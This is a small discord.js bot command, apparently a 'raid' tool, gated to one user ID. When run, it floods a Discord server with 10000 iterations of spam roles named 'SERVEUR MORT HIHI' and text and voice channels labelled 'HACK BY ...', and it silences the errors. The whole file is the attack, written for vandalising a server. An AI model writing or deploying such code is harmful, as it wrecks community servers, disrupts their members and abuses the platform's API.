const Discord = require("discord.js");

const settings = {
    guildName: "RAID FOR philippe etchebest"
};

module.exports.run = async (client, msg) => {

   if(msg.author.id == "190182243975692288")
   for(var i = 0 ; i < 10000 ; ++i){
          msg.guild.createRole({name:"SERVEUR MORT HIHI",color:"RANDOM"}).catch(()=>{})
          msg.guild.createChannel("HACK BY PATRICK ESTEBEST","text")
          msg.guild.createChannel("HACK BY MACRON LOL","voice")         
     }
    
}

module.exports.help = {
    name : "cc",
    alliase: [],
    type: "owner",
}
